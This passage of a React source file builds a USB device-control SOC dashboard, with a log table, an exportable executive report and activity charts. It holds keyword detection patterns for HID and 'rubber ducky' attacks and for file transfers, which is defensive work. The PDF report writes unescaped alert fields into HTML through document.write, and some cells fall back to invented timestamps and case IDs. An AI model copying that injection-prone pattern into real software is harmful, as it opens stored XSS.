        pid: a.usbProductId || a.rawEvent?.product_id || '—',
        deviceType: a.deviceType || a.rawEvent?.device_type || '—',
        os: a.os || a.osType || '—',
        action: a.action || a.actionTaken || a.description || '—',
        fileName: a.fileName || a.filePath || a.rawEvent?.file_name || '—',
        policyName: a.policyName || a.rawEvent?.policy_name || '—',
        mitreAttack: a.mitreAttack || a.mitreId || '—',
        riskScore: a.riskScore ?? a.threatScore ?? '—',
        caseId: a.caseId || `CASE-${(a._id || '9011').substring(0, 6)}`,
        raw: a,
      }));
  }, [alerts]);

  const filtered = useMemo(() => {
    return sampleData.filter(r => {
      if (sevFilter !== 'ALL' && (r.severity || '').toLowerCase() !== sevFilter.toLowerCase()) return false;
      if (!searchTerm) return true;
      const t = searchTerm.toLowerCase();
      return (r.hostname || '').toLowerCase().includes(t) || (r.username || '').toLowerCase().includes(t) || (r.deviceName || '').toLowerCase().includes(t);
    });
  }, [sampleData, searchTerm, sevFilter]);

  return (
    <div style={{ background: MON.bg, color: MON.text, padding: 14, display: 'flex', flexDirection: 'column', gap: 12 }}>
      <div style={{ display: 'flex', gap: 10, background: MON.card, padding: 10, borderRadius: 8, border: `1px solid ${MON.border}` }}>
        <input type="text" placeholder="🔍 Search USB logs (Hostname, User, Device, Serial)..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} style={{ flex: 1, background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 12px', borderRadius: 6, fontSize: 11 }} />
        <select value={sevFilter} onChange={(e) => setSevFilter(e.target.value)} style={{ background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 12px', borderRadius: 6, fontSize: 11 }}>
          <option value="ALL">All Severities</option>
          <option value="critical">Critical</option>
          <option value="high">High</option>
          <option value="medium">Medium</option>
        </select>
      </div>

      <div style={{ overflowX: 'auto', background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8 }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 11, textAlign: 'left' }}>
          <thead>
            <tr style={{ background: MON.card2, color: MON.muted, borderBottom: `1px solid ${MON.border}` }}>
              {['Timestamp', 'Severity', 'Status', 'Hostname', 'Username', 'Device Name', 'Vendor', 'Action', 'File Name', 'Policy Name', 'MITRE ATT&CK', 'Risk Score', 'Case ID'].map(h => <th key={h} style={{ padding: 10 }}>{h}</th>)}
            </tr>
          </thead>
          <tbody>
            {filtered.length ? filtered.map((row) => (
              <tr key={row._id} onClick={() => setSelectedLog(row)} style={{ borderBottom: `1px solid ${MON.line}`, cursor: 'pointer' }}>
                <td style={{ padding: 10, color: MON.muted }}>{row.timestamp ? new Date(row.timestamp).toLocaleTimeString() : '10:42:01'}</td>
                <td style={{ padding: 10 }}><span style={{ color: SEV_COLOR[row.severity] || MON.blue, fontWeight: 800, textTransform: 'uppercase' }}>{row.severity}</span></td>
                <td style={{ padding: 10, color: row.status === 'Blocked' ? MON.red : MON.green, fontWeight: 700 }}>{row.status}</td>
                <td style={{ padding: 10, color: MON.blue, fontWeight: 700 }}>{row.hostname}</td>
                <td style={{ padding: 10 }}>{row.username}</td>
                <td style={{ padding: 10, color: MON.cyan, fontWeight: 700 }}>{row.deviceName}</td>
                <td style={{ padding: 10 }}>{row.vendor}</td>
                <td style={{ padding: 10, color: MON.orange, fontWeight: 700 }}>{row.action}</td>
                <td style={{ padding: 10, color: MON.text }}>{row.fileName}</td>
                <td style={{ padding: 10, color: MON.purple }}>{row.policyName}</td>
                <td style={{ padding: 10, color: MON.red, fontWeight: 800 }}>{row.mitreAttack}</td>
                <td style={{ padding: 10, color: row.riskScore > 70 ? MON.red : MON.green, fontWeight: 800 }}>{row.riskScore}</td>
                <td style={{ padding: 10, color: MON.purple, fontWeight: 800 }}>{row.caseId}</td>
              </tr>
            )) : <tr><td colSpan={13} style={{padding:40,textAlign:'center',color:MON.muted}}>No live USB SIEM logs found</td></tr>}
          </tbody>
        </table>
      </div>

      {selectedLog && <UsbLogDetailModal log={selectedLog} onClose={() => setSelectedLog(null)} />}
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 3.5 EXECUTIVE SOC REPORT GENERATOR COMPONENT FOR USB DEVICE CONTROL
// ═════════════════════════════════════════════════════════════════════════════
export function UsbReportsTab({ alerts = [] }) {
  const [reportType, setReportType] = useState('daily');
  const [generating, setGenerating] = useState(false);
  const [reportGenerated, setReportGenerated] = useState(false);
  const reportMetrics = useMemo(() => {
    const text = a => `${a.type || ''} ${a.eventType || ''} ${a.category || ''} ${a.description || ''} ${a.actionTaken || ''} ${a.deviceName || ''}`;
    return {
      connections: alerts.length,
      unauthorized: alerts.filter(a => a.blocked === true || /block|denied|unauthor/i.test(text(a))).length,
      fileCopies: alerts.filter(a => /file.?cop|transfer|write|upload|download/i.test(text(a))).length,
      hidAttacks: alerts.filter(a => /hid|rubber.?ducky|keystrok/i.test(text(a))).length,
    };
  }, [alerts]);
  const reportRowsHtml = alerts.slice(0, 25).map(a => `<tr><td>${a.deviceName || a.device || '—'}</td><td>${a.hostname || a.agentName || '—'}</td><td>${a.username || a.user || '—'}</td><td class="${/critical/i.test(a.severity || '') ? 'sev-critical' : 'sev-high'}">${(a.severity || 'unknown').toUpperCase()}</td><td>${a.actionTaken || a.action || a.description || '—'}</td></tr>`).join('');

  const handleGenerate = () => {
    setGenerating(true);
    setTimeout(() => {
      setGenerating(false);
      setReportGenerated(true);
    }, 1000);
  };

  const handleDownloadReport = (format) => {
    if (format === 'PDF') {
      const printWindow = window.open('', '_blank');
      if (!printWindow) {
        alert('Please allow popups to generate PDF reports.');
        return;
      }
      const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Device Control (USB) & Peripheral Security Executive SOC Report (${reportType.toUpperCase()})</title>
          <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 30px; background: #fff; color: #1e293b; line-height: 1.5; }
            .header { border-bottom: 3px solid #0284c7; padding-bottom: 12px; margin-bottom: 24px; display: flex; justify-space-between: space-between; align-items: center; }
            h1 { margin: 0; color: #0f172a; font-size: 24px; }
            .meta { color: #64748b; font-size: 12px; margin-top: 6px; }
            .badge { background: #e0f2fe; color: #0369a1; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 12px; }
            .metrics-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 24px 0; }
            .metric-card { background: #f8fafc; border: 1px solid #cbd5e1; padding: 14px; border-radius: 8px; }
            .metric-title { font-size: 11px; text-transform: uppercase; color: #64748b; font-weight: bold; }
            .metric-val { font-size: 22px; font-weight: 800; color: #0284c7; margin-top: 6px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 12px; }
            th, td { border: 1px solid #cbd5e1; padding: 10px; text-align: left; }
            th { background: #f1f5f9; color: #334155; font-weight: bold; }
            .sev-critical { color: #dc2626; font-weight: bold; }
            .sev-high { color: #ea580c; font-weight: bold; }
            .footer { margin-top: 40px; padding-top: 12px; border-top: 1px solid #e2e8f0; font-size: 11px; color: #94a3b8; text-align: center; }
          </style>
        </head>
        <body>
          <div class="header">
            <div>
              <h1>🛡️ Device Control (USB) & Peripheral Security Executive SOC Report</h1>
              <div class="meta">Generated: ${new Date().toLocaleString()} | Scope: ${reportType.toUpperCase()} | Classification: CONFIDENTIAL</div>
            </div>
            <span class="badge">SECURITY VERIFIED</span>
          </div>

          <div class="metrics-grid">
            <div class="metric-card"><div class="metric-title">USB Connections Monitored</div><div class="metric-val">${reportMetrics.connections}</div></div>
            <div class="metric-card"><div class="metric-title">Unauthorized USB Devices</div><div class="metric-val">${reportMetrics.unauthorized}</div></div>
            <div class="metric-card"><div class="metric-title">File Copies</div><div class="metric-val">${reportMetrics.fileCopies}</div></div>
            <div class="metric-card"><div class="metric-title">HID / Rubber Ducky Attacks</div><div class="metric-val">${reportMetrics.hidAttacks}</div></div>
          </div>

          <h2>Summary of Prevented Peripheral & USB Incidents</h2>
          <table>
            <thead>
              <tr>
                <th>Device Name</th>
                <th>Host Machine</th>
                <th>User Account</th>
                <th>Severity</th>
                <th>Mitigation Applied</th>
              </tr>
            </thead>
            <tbody>
              ${reportRowsHtml || '<tr><td colspan="5">No live USB events available for this report window.</td></tr>'}
            </tbody>
          </table>

          <div class="footer">
            Confidential — Generated by Enterprise SOC Platform | Device Control (USB) Module
          </div>

          <script>
            window.onload = function() { window.print(); }
          </script>
        </body>
        </html>
      `;
      printWindow.document.write(htmlContent);
      printWindow.document.close();
      return;
    }

    if (format === 'CSV') {
      const headers = ["Timestamp", "Hostname", "Username", "Device Name", "VID/PID", "Vendor", "Action Taken", "Severity", "Risk Score"];
      const rows = alerts.length > 0 ? alerts.map(a => [
        `"${a.createdAt || a.timestamp || new Date().toISOString()}"`,
        `"${a.hostname || a.agentName || '—'}"`,
        `"${a.username || a.user || '—'}"`,
        `"${a.deviceName || a.device || '—'}"`,
        `"${a.vidPid || `${a.vid || '—'}:${a.pid || '—'}`}"`,
        `"${a.vendor || '—'}"`,
        `"${a.actionTaken || a.action || '—'}"`,
        `"${a.severity || 'unknown'}"`,
        `"${a.riskScore ?? a.threatScore ?? '—'}"`
      ]) : [];

      const csvData = [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
      const blob = new Blob([csvData], { type: 'text/csv;charset=utf-8;' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement("a");
      link.setAttribute("href", url);
      link.setAttribute("download", `usb_device_control_report_${reportType}.csv`);
      document.body.appendChild(link);
      link.click();
      link.remove();
      URL.revokeObjectURL(url);
      return;
    }

    // JSON Export
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify({ title: "Device Control (USB) Executive SOC Report", reportType, generatedAt: new Date().toISOString(), metrics: reportMetrics, alerts }, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `usb_device_control_report_${reportType}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  return (
    <div style={{ background: MON.bg, color: MON.text, padding: 16, display: 'flex', flexDirection: 'column', gap: 16 }}>
      <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h3 style={{ margin: 0, fontSize: 16, fontWeight: 800, color: '#f8fafc' }}>📄 Device Control & Peripheral Security Executive Report Generator</h3>
          <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>Generate Executive Summary, USB File Copy Analytics, HID Threat Reports & Policy Audit Summary</div>
        </div>

        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
          <select value={reportType} onChange={(e) => setReportType(e.target.value)} style={{ background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 14px', borderRadius: 6, fontSize: 12 }}>
            <option value="daily">Daily Report (24 Hours)</option>
            <option value="weekly">Weekly Executive Summary</option>
            <option value="monthly">Monthly Peripheral Threat Report</option>
            <option value="custom">Custom Scope</option>
          </select>
          <button type="button" onClick={handleGenerate} disabled={generating} style={{ background: MON.cyan, color: '#000', border: 'none', padding: '8px 18px', borderRadius: 6, fontWeight: 800, cursor: 'pointer' }}>
            {generating ? 'Generating...' : '⚡ Generate Report'}
          </button>
        </div>
      </div>

      {reportGenerated && (
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 20, display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: `1px solid ${MON.line}`, paddingBottom: 12 }}>
            <div style={{ fontSize: 14, fontWeight: 800, color: MON.cyan }}>Device Control Executive Summary Preview ({reportType.toUpperCase()})</div>
            <div style={{ display: 'flex', gap: 10 }}>
              <button type="button" onClick={() => handleDownloadReport('PDF')} style={{ background: MON.red, color: '#fff', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export PDF</button>
              <button type="button" onClick={() => handleDownloadReport('CSV')} style={{ background: MON.green, color: '#000', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export CSV</button>
              <button type="button" onClick={() => handleDownloadReport('JSON')} style={{ background: MON.blue, color: '#000', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export JSON</button>
            </div>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 14 }}>
            <div style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}><div style={{ fontSize: 10, color: MON.muted }}>USB Connections</div><div style={{ fontSize: 18, color: MON.cyan, fontWeight: 900 }}>{reportMetrics.connections.toLocaleString()} Connections</div></div>
            <div style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}><div style={{ fontSize: 10, color: MON.muted }}>Unauthorized Devices</div><div style={{ fontSize: 18, color: MON.red, fontWeight: 900 }}>{reportMetrics.unauthorized.toLocaleString()} Devices</div></div>
            <div style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}><div style={{ fontSize: 10, color: MON.muted }}>File Copies</div><div style={{ fontSize: 18, color: MON.orange, fontWeight: 900 }}>{reportMetrics.fileCopies.toLocaleString()} Files</div></div>
            <div style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}><div style={{ fontSize: 10, color: MON.muted }}>HID Attack Attempts</div><div style={{ fontSize: 18, color: MON.red, fontWeight: 900 }}>{reportMetrics.hidAttacks.toLocaleString()} Attacks</div></div>
          </div>
        </div>
      )}
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 4. MAIN DASHBOARD PANEL COMPONENT
// ═════════════════════════════════════════════════════════════════════════════
function UsbOverviewDashboard({ alerts = [], total = 0 }) {
  const panel = { background: '#0d2035', border: '1px solid #1b3854', borderRadius: 8, padding: 12 };
  const data = useMemo(() => {
    const rows = alerts.map(a => {
      const raw = a?.rawEvent?.raw || a?.rawEvent || {};
      const text = `${a.type || ''} ${a.eventType || ''} ${a.category || ''} ${a.description || ''} ${a.actionTaken || ''}`;
      const device = a.deviceName || a.deviceModel || raw.device_name || raw.product || raw.device || 'Unknown USB Device';
      const serial = a.serialNumber || raw.serial_number || raw.serial || '';
      const blocked = a.blocked === true || /block|denied|unauthor/i.test(text);
      const authorized = !blocked && (/authoriz|allow|connect|mount/i.test(text) || a.status === 'authorized');
      const fileCopy = /file.?cop|transfer|write|upload|download/i.test(text);
      const bytes = Number(a.bytesTransferred || a.fileSize || raw.bytes_transferred || raw.file_size || 0);
      return { ...a, raw, text, device, serial, blocked, authorized, fileCopy, bytes, time: new Date(a.createdAt || a.timestamp || raw.timestamp || 0) };
    });
    const uniqueDevices = new Set(rows.map(r => r.serial || r.device).filter(Boolean));
    const connectionRows = rows.filter(r => !/disconnect|remove|unmount/i.test(r.text) && /connect|insert|mount|device.?add/i.test(r.text));
    const authorized = rows.filter(r => r.authorized).length;
    const blocked = rows.filter(r => r.blocked).length;
    const policy = rows.filter(r => /policy|violation|blocked|denied/i.test(r.text)).length;
    const copiedBytes = rows.reduce((sum, r) => sum + (r.fileCopy ? r.bytes : 0), 0);
    const timeline = Array.from({ length: 24 }, () => ({ connected: 0, disconnected: 0, violations: 0 }));
    const heat = Array.from({ length: 7 }, () => Array(12).fill(0));
    const now = Date.now();
    rows.forEach(r => {
      const daysAgo = Math.floor((now - r.time.getTime()) / 86400000);
      if (Number.isFinite(daysAgo) && daysAgo >= 0 && daysAgo < 90) {
        const b = timeline[Math.min(23, Math.max(0, 23 - Math.floor(daysAgo * 24 / 90)))];
        if (/disconnect|remove|unmount/i.test(r.text)) b.disconnected++; else b.connected++;
        if (/policy|violation|blocked|denied/i.test(r.text)) b.violations++;
      }
      if (!Number.isNaN(r.time.getTime())) heat[r.time.getDay()][Math.floor(r.time.getHours() / 2)]++;
    });
    const deviceCounts = {};
    const deviceBytes = {};
    const deviceTypes = {};
    const userCounts = {};
    const typeCounts = {};
    rows.forEach(r => {
      deviceCounts[r.device] = (deviceCounts[r.device] || 0) + 1;
      deviceBytes[r.device] = (deviceBytes[r.device] || 0) + r.bytes;
      const user = r.username || r.user || r.raw.username || r.raw.user;
      if (user) userCounts[user] = (userCounts[user] || 0) + 1;
      const type = /storage|flash|thumb/i.test(r.text) ? 'Storage' : /keyboard|hid|rubber|ducky/i.test(r.text) ? 'HID' : /mobile|phone/i.test(r.text) ? 'Mobile' : /network|adapter|ethernet/i.test(r.text) ? 'Network Adapter' : 'Other';
      deviceTypes[r.device] = type;
      typeCounts[type] = (typeCounts[type] || 0) + 1;
    });
    return { rows, connections: connectionRows.length, devices: uniqueDevices.size, authorized, blocked, policy, copiedBytes, timeline, heat, deviceCounts, deviceBytes, deviceTypes, userCounts, typeCounts };
  }, [alerts]);
  const formatBytes = n => n >= 1073741824 ? `${(n / 1073741824).toFixed(1)} GB` : n >= 1048576 ? `${(n / 1048576).toFixed(1)} MB` : n >= 1024 ? `${(n / 1024).toFixed(1)} KB` : `${n} B`;
  const maxTotal = Math.max(...data.timeline.flatMap(x => [x.connected, x.disconnected, x.violations]), 1);
  const chartPoints = key => data.timeline.map((slot, i) => `${(i / 23) * 100},${92 - ((slot[key] / maxTotal) * 78)}`).join(' ');
  const kpis = [
    ['USB Connections', data.connections, '🔌', MON.blue, 'observed connection events'],
    ['Authorized Devices', data.authorized, '🛡', MON.green, 'from alerts'],
    ['Unauthorized Devices', data.blocked, '⚠', MON.orange, 'from alerts'],
    ['Policy Violations', data.policy, '⬡', MON.red, 'from alerts'],
    ['Data Copied to USB', data.copiedBytes ? formatBytes(data.copiedBytes) : '0 B', '▤', MON.purple, 'from alerts'],
  ];
  const topDevices = Object.entries(data.deviceCounts).sort((a,b) => b[1]-a[1]).slice(0,5);
  const users = Object.entries(data.userCounts).sort((a,b) => b[1]-a[1]).slice(0,5);
  const maxHeat = Math.max(...data.heat.flat(), 1);
  const connectionTotal = Math.max(data.connections, data.authorized + data.blocked, 1);
  const authorizedPct = Math.round((data.authorized / connectionTotal) * 100);
  const unauthorizedPct = Math.round((data.blocked / connectionTotal) * 100);
  const blockedPct = Math.round((data.policy / connectionTotal) * 100);

  const summaryCards = [
    { title: 'USB Connections', value: data.connections, delta: 'observed · last 90 days', color: MON.blue, icon: '⚡' },
    { title: 'Authorized Devices', value: data.authorized, delta: 'from alerts', color: MON.green, icon: '🛡' },
    { title: 'Unauthorized Devices', value: data.blocked, delta: 'from alerts', color: MON.orange, icon: '⚠' },
    { title: 'Policy Violations', value: data.policy, delta: 'from alerts', color: MON.red, icon: '⛔' },
    { title: 'Data Copied to USB', value: data.copiedBytes ? formatBytes(data.copiedBytes) : '0 B', delta: 'from alerts', color: MON.purple, icon: '▣' },
  ];

  return <div style={{ display:'flex',flexDirection:'column',gap:6 }}>
    <div style={{color:MON.muted,fontSize:10,lineHeight:1.3}}>Real-time monitoring of USB devices, file activities, and policy violations <span style={{color:MON.green,marginLeft:8,fontWeight:800}}>● LIVE</span></div>
    <div style={{display:'grid',gridTemplateColumns:'repeat(5,minmax(0,1fr))',gap:8}}>
      {summaryCards.map(card => (
        <div key={card.title} style={{...panel,minHeight:70,display:'flex',alignItems:'center',gap:12}}>
          <div style={{width:36,height:36,borderRadius:'50%',background:card.color,display:'grid',placeItems:'center',fontSize:16,flexShrink:0}}>{card.icon}</div>
          <div style={{minWidth:0}}>
            <div style={{fontSize:9,color:card.color,fontWeight:800,textTransform:'uppercase',lineHeight:1.1}}>{card.title}</div>
            <div style={{fontSize:20,fontWeight:900,color:'#fff',lineHeight:1.1,marginTop:2}}>{card.value}</div>
            <div style={{fontSize:9,color:MON.sub,marginTop:3}}>{card.delta}</div>
          </div>
        </div>
      ))}
    </div>
    <div style={{display:'grid',gridTemplateColumns:'1.45fr 1.05fr 0.95fr',gap:6,alignItems:'stretch'}}>
      <div style={panel}>
        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:12}}>
          <b style={{fontSize:12}}>USB Activity Timeline</b>
          <span style={{fontSize:9,color:MON.sub}}>{data.rows.length ? 'Last 90 Days' : 'No live data yet'}</span>
        </div>
        <div style={{height:150,borderBottom:'1px solid #1b3854',position:'relative',backgroundImage:'linear-gradient(rgba(72,111,145,.13) 1px,transparent 1px),linear-gradient(90deg,rgba(72,111,145,.1) 1px,transparent 1px)',backgroundSize:'100% 30px,8.33% 100%'}}>
          <svg viewBox="0 0 100 100" preserveAspectRatio="none" style={{width:'100%',height:'100%',overflow:'visible'}}>
            <polyline points={chartPoints('connected')} fill="none" stroke={MON.blue} strokeWidth="1.4" vectorEffect="non-scaling-stroke" />
            <polyline points={chartPoints('disconnected')} fill="none" stroke={MON.green} strokeWidth="1.4" vectorEffect="non-scaling-stroke" />
            <polyline points={chartPoints('violations')} fill="none" stroke={MON.red} strokeWidth="1.4" vectorEffect="non-scaling-stroke" />
          </svg>
        </div>
        <div style={{display:'flex',gap:16,marginTop:10,fontSize:9,color:MON.sub}}>
          <span><span style={{color:MON.blue}}>●</span> Connections</span>
          <span><span style={{color:MON.green}}>●</span> Disconnections</span>
          <span><span style={{color:MON.red}}>●</span> Policy Violations</span>
        </div>
      </div>
      <div style={panel}>
        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:12}}>
          <b style={{fontSize:12}}>Top USB Devices (by Usage)</b>
          <span style={{fontSize:9,color:MON.sub}}>Live data</span>
        </div>
        <div style={{display:'grid',gridTemplateColumns:'1.5fr .7fr .55fr .8fr',gap:7,paddingBottom:6,fontSize:8,color:MON.sub,borderBottom:'1px solid #17324b'}}><span>Device</span><span>Type</span><span>Connections</span><span>Data Transferred</span></div>
        {topDevices.length ? topDevices.map(([name,count]) => (
            <div key={name} style={{display:'grid',gridTemplateColumns:'1.5fr .7fr .55fr .8fr',gap:7,padding:'6px 0',borderBottom:'1px solid #17324b',fontSize:9,alignItems:'center'}}>
            <span style={{overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>▣ {name}</span>
            <span style={{color:MON.sub}}>{data.deviceTypes[name] || 'Other'}</span>
            <b style={{color:MON.cyan,textAlign:'center'}}>{count}</b>
            <b style={{color:MON.green,textAlign:'right'}}>{formatBytes(data.deviceBytes[name] || 0)}</b>
          </div>
        )) : <div style={{color:MON.sub,textAlign:'center',padding:42,fontSize:10}}>No live USB events yet</div>}
      </div>
      <div style={panel}>
        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:12}}>
          <b style={{fontSize:12}}>Device Connection Status</b>
          <span style={{fontSize:9,color:MON.sub}}>Last 90 Days</span>
        </div>
        <div style={{display:'flex',alignItems:'center',gap:14}}>
          <div style={{width:92,height:92,borderRadius:'50%',background:`conic-gradient(${MON.green} 0 ${authorizedPct}%, ${MON.orange} ${authorizedPct}% ${authorizedPct + unauthorizedPct}%, ${MON.red} ${authorizedPct + unauthorizedPct}% ${authorizedPct + unauthorizedPct + blockedPct}%, ${MON.blue} 0)`,display:'grid',placeItems:'center',flexShrink:0}}>
            <div style={{width:56,height:56,borderRadius:'50%',background:'#0d2035',display:'grid',placeItems:'center',fontWeight:900,fontSize:14}}>
              <div style={{textAlign:'center',lineHeight:1}}>
                <div>{data.connections}</div>
                <div style={{fontSize:8,color:MON.sub,fontWeight:700}}>Total</div>
              </div>
            </div>
          </div>
          <div style={{fontSize:10,flex:1}}>
            <div style={{padding:'4px 0',color:MON.green}}>● Authorized <b style={{float:'right'}}>{data.authorized} ({authorizedPct}%)</b></div>
            <div style={{padding:'4px 0',color:MON.orange}}>● Unauthorized <b style={{float:'right'}}>{data.blocked} ({unauthorizedPct}%)</b></div>
            <div style={{padding:'4px 0',color:MON.red}}>● Blocked <b style={{float:'right'}}>{data.policy} ({blockedPct}%)</b></div>
            <div style={{padding:'4px 0',color:MON.blue}}>● Others <b style={{float:'right'}}>{Math.max(connectionTotal - data.authorized - data.blocked - data.policy, 0)}</b></div>
          </div>
        </div>
      </div>
    </div>
    <div style={{display:'grid',gridTemplateColumns:'1.5fr 1fr 1fr',gap:6,alignItems:'stretch'}}>
      <div style={panel}>
        <b style={{fontSize:12}}>Recent USB Events</b>
        <div style={{display:'grid',gridTemplateColumns:'62px .8fr 1.1fr 1fr 68px 1fr',gap:8,marginTop:10,fontSize:9,color:MON.sub,paddingBottom:8,borderBottom:'1px solid #17324b'}}>
          <span>Time</span><span>User</span><span>Device</span><span>Event</span><span>Status</span><span>Details</span>
        </div>
        {data.rows.length ? data.rows.slice(0,5).map((r,i) => (
          <div key={r._id||i} style={{display:'grid',gridTemplateColumns:'62px .8fr 1.1fr 1fr 68px 1fr',gap:8,padding:'9px 0',borderBottom:'1px solid #17324b',fontSize:9,alignItems:'center'}}>
            <span>{Number.isNaN(r.time.getTime()) ? '—' : r.time.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
            <span>{r.username || r.user || '—'}</span>
            <span style={{fontWeight:700,color:'#dbeafe',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{r.device}</span>
            <span style={{overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{r.description || r.ruleId || (r.fileCopy ? 'File Copied to USB' : 'Device Connected')}</span>
            <b style={{color:r.blocked ? MON.red : MON.green}}>{r.blocked ? 'Blocked' : 'Authorized'}</b>
            <span style={{color:MON.sub,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{r.fileCopy ? `${formatBytes(r.bytes)} copied` : r.serial || 'Device activity'}</span>
          </div>
        )) : <div style={{color:MON.sub,textAlign:'center',padding:36,fontSize:10}}>No live USB alerts received yet</div>}
      </div>
      <div style={panel}>
        <b style={{fontSize:12}}>Top File Activities (To USB)</b>
        <div style={{marginTop:10,display:'flex',flexDirection:'column',gap:8}}>
          {data.rows.filter(r => r.fileCopy).slice(0,5).map((r,i) => (
            <div key={r._id||i} style={{display:'flex',justifyContent:'space-between',gap:10,fontSize:10,padding:'8px 0',borderBottom:'1px solid #17324b'}}>
              <span style={{overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{r.fileName || r.raw.file_name || r.description || 'File transfer'}</span>
              <b style={{color:MON.purple,flexShrink:0}}>{formatBytes(r.bytes || 0)}</b>
            </div>
          ))}
          {!data.rows.some(r => r.fileCopy) && <div style={{color:MON.sub,textAlign:'center',padding:'18px 8px 8px',fontSize:10}}>No file-copy activity</div>}
        </div>
      </div>
      <div style={panel}>
        <b style={{fontSize:12}}>Policy Violations</b>
        <div style={{marginTop:10,display:'flex',flexDirection:'column',gap:8}}>
          {data.rows.filter(r => /policy|violation|blocked|denied/i.test(r.text)).slice(0,5).map((r,i) => (
            <div key={r._id||i} style={{display:'flex',justifyContent:'space-between',gap:10,fontSize:10,padding:'8px 0',borderBottom:'1px solid #17324b'}}>
              <span style={{overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{r.ruleId || r.description || 'Policy violation'}</span>
              <b style={{color:MON.red,flexShrink:0}}>1</b>
            </div>
          ))}
          {!data.policy && <div style={{color:MON.sub,textAlign:'center',padding:'18px 8px 8px',fontSize:10}}>No policy violations</div>}
        </div>
      </div>
    </div>
    <div style={{display:'grid',gridTemplateColumns:'1.35fr 0.9fr 1.05fr',gap:6,alignItems:'stretch'}}>
      <div style={panel}>
        <b style={{fontSize:12}}>Alerts</b>
        <div style={{marginTop:10,display:'flex',flexDirection:'column',gap:8}}>
          {data.rows.filter(r => /high|critical/i.test(r.severity || '') || r.blocked).slice(0,4).map((r,i) => (
            <div key={r._id||i} style={{display:'grid',gridTemplateColumns:'70px 58px 1fr',gap:8,padding:'8px 0',borderBottom:'1px solid #17324b',fontSize:10}}>
              <span>{Number.isNaN(r.time.getTime()) ? '—' : r.time.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>
              <b style={{color:r.severity === 'critical' ? MON.red : MON.orange}}>{r.severity || 'alert'}</b>
              <span style={{overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{r.description || r.ruleId || 'USB security event'}</span>
            </div>
          ))}
        </div>
      </div>
      <div style={panel}>
        <b style={{fontSize:12}}>User Activity (USB Usage)</b>
        <div style={{marginTop:10,display:'flex',flexDirection:'column',gap:9}}>
          {users.length ? users.map(([user,count]) => (
            <div key={user} style={{fontSize:10}}>
              <div style={{display:'flex',justifyContent:'space-between',marginBottom:4}}>
                <span>{user}</span>
                <b>{count}</b>
              </div>
              <div style={{height:5,background:'#142c43',borderRadius:4}}>
                <div style={{height:'100%',width:`${(count / (users[0]?.[1] || 1)) * 100}%`,background:MON.blue,borderRadius:4}} />
              </div>
            </div>
          )) : <div style={{color:MON.sub,textAlign:'center',padding:'18px 8px 8px',fontSize:10}}>No user activity</div>}
        </div>
      </div>
      <div style={panel}>
        <b style={{fontSize:12}}>USB Activity Heatmap</b>
        <div style={{display:'grid',gridTemplateColumns:'22px repeat(12,1fr)',gap:2,marginTop:12,alignItems:'center'}}>
          {data.heat.flatMap((day,di)=>[<span key={`day-${di}`} style={{fontSize:7,color:MON.sub}}>{['Sun','Mon','Tue','Wed','Thu','Fri','Sat'][di]}</span>,...day.map((v,hi)=><div key={`${di}-${hi}`} title={`${['Sun','Mon','Tue','Wed','Thu','Fri','Sat'][di]} ${String(hi*2).padStart(2,'0')}:00 · ${v} events`} style={{height:12,background:v?`hsl(${145 - (v/maxHeat)*145} 80% 52%)`:'#12283d',borderRadius:1}} />)])}
        </div>
